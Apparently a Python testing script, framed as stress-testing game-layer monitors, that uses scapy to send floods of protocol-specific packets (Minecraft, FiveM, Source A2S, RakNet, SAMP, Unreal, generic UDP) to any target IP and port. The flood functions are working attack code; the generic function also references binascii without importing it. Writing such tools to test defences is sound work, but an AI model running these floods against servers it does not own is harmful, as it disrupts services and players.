#!/usr/bin/env python3
"""
Game Attack Simulator
Part of Phase 10: Game Layer Stress Testing.

Responsibility: Generates protocol-specific traffic to test Layer G monitors.
"""

import sys
import argparse
import random
import time
import logging
from scapy.all import IP, TCP, UDP, Raw, send, conf
if sys.platform == "win32":
    try:
        from scapy.all import L3RawSocket
        conf.L3socket = L3RawSocket
    except ImportError:
        pass


# -----------------------------------------------------------------------------
# Attack Generators
# -----------------------------------------------------------------------------

def simulate_minecraft_handshake(target_ip, target_port, count, pps):
    logging.info(f"Simulating Minecraft Handshake flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    
    # Minecraft Handshake Packet (Java Edition)
    # [VarInt ID 0x00] [VarInt Proto] [String Host] [Unsigned Short Port] [VarInt NextState]
    # Simplified payload: \x0f\x00 (length 15, ID 0) + fake data
    payload = b'\x0f\x00\x2f\x09localhost\x63\xdd\x01' 
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        sport = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags="PA")/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

def simulate_fivem_getinfo(target_ip, target_port, count, pps):
    logging.info(f"Simulating FiveM getinfo flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    
    # FiveM / CitizenFX getinfo query
    payload = b'\xff\xff\xff\xffgetinfo xxx'
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        sport = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/UDP(sport=sport, dport=target_port)/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

def simulate_source_a2s_info(target_ip, target_port, count, pps):
    logging.info(f"Simulating Source A2S_INFO flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    
    # Source Engine A2S_INFO query
    payload = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        sport = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/UDP(sport=sport, dport=target_port)/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

def simulate_rust_handshake(target_ip, target_port, count, pps):
    logging.info(f"Simulating Rust (RakNet) handshake flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    # RakNet Open Connection Request 1 (ID 0x05)
    # Payload: 0x05 + Magic + Protocol Version
    payload = b'\x05\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x06'
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        pkt = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

def simulate_metin2_handshake(target_ip, target_port, count, pps):
    logging.info(f"Simulating Metin2 TCP handshake malformed flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    # Send short/malformed packets to trigger 'malformed_packet' or 'timing_anomaly'
    # Valid header is usually longer. Sending 2 bytes is anomalous.
    payload = b'\x32\x01'
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        sport = random.randint(1024, 65535)
        # Syn-Ack or established flow simulation would require more state, here we just push payload
        pkt = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags="PA")/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

def simulate_samp_query(target_ip, target_port, count, pps, variant="i"):
    logging.info(f"Simulating SAMP Query ('{variant}') flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    
    # SAMP Header: "SAMP" (4 bytes) + IP (4 bytes) + Port (2 bytes) + Opcode (1 byte)
    # We fake the IP/Port part for simplicity
    header = b'SAMP\x7f\x00\x00\x01\x1e\x61' # 127.0.0.1:7777
    opcode = b'i'
    if variant == 'c': opcode = b'c'
    elif variant == 'r': opcode = b'r'
    elif variant == 'p': opcode = b'p'
    
    payload = header + opcode
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        pkt = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

def simulate_unreal_flood(target_ip, target_port, count, pps):
    logging.info(f"Simulating Unreal Engine random UDP flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    # Unreal packets are often just raw UDP binary data.
    payload = b'\x01\x02\x03\x04' * 8 
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        pkt = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

def simulate_generic_flood(target_ip, target_port, count, pps, payload_str=None):
    logging.info(f"Simulating Generic flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    
    if payload_str:
        try:
            payload = binascii.unhexlify(payload_str)
        except:
            payload = payload_str.encode()
    else:
        payload = b'GENERIC_FLOOD_DATA'

    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        pkt = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Game Protocol Attack Simulator")
    parser.add_argument("--type", required=True, choices=[
        "minecraft", "fivem", "source", 
        "rust", "metin2", "samp", "unreal", "generic"
    ], help="Attack type")
    parser.add_argument("--target", required=True, help="Target IP")
    parser.add_argument("--port", type=int, help="Target Port (auto-picked if missing)")
    parser.add_argument("--count", type=int, default=100, help="Total packets to send")
    parser.add_argument("--pps", type=int, default=10, help="Packets per second")
    parser.add_argument("--variant", default="i", help="Attack variant (e.g. SAMP opcode c/r/i)")
    parser.add_argument("--payload", help="Custom payload string/hex for generic tests")
    parser.add_argument("--log-level", default="INFO", help="Logging level")

    args = parser.parse_args()

    logging.basicConfig(level=args.log_level, format='%(asctime)s [%(levelname)s] %(message)s')

    # Default ports
    ports = {
        "minecraft": 25565, "fivem": 30120, "source": 27015,
        "rust": 28015, "metin2": 11002, "samp": 7777,
        "unreal": 7777, "generic": 9999
    }
    port = args.port if args.port else ports.get(args.type, 9999)

    try:
        if args.type == "minecraft":
            simulate_minecraft_handshake(args.target, port, args.count, args.pps)
        elif args.type == "fivem":
            simulate_fivem_getinfo(args.target, port, args.count, args.pps)
        elif args.type == "source":
            simulate_source_a2s_info(args.target, port, args.count, args.pps)
        elif args.type == "rust":
            # Rust uses RakNet, simulate handshake
            simulate_rust_handshake(args.target, port, args.count, args.pps)
        elif args.type == "metin2":
            simulate_metin2_handshake(args.target, port, args.count, args.pps)
        elif args.type == "samp":
            simulate_samp_query(args.target, port, args.count, args.pps, args.variant)
        elif args.type == "unreal":
            simulate_unreal_flood(args.target, port, args.count, args.pps)
        elif args.type == "generic":
            simulate_generic_flood(args.target, port, args.count, args.pps, args.payload)

    except KeyboardInterrupt:
        logging.info("Simulation stopped by user.")
    except Exception as e:
        logging.error(f"Simulation error: {e}")

if __name__ == "__main__":
    main()
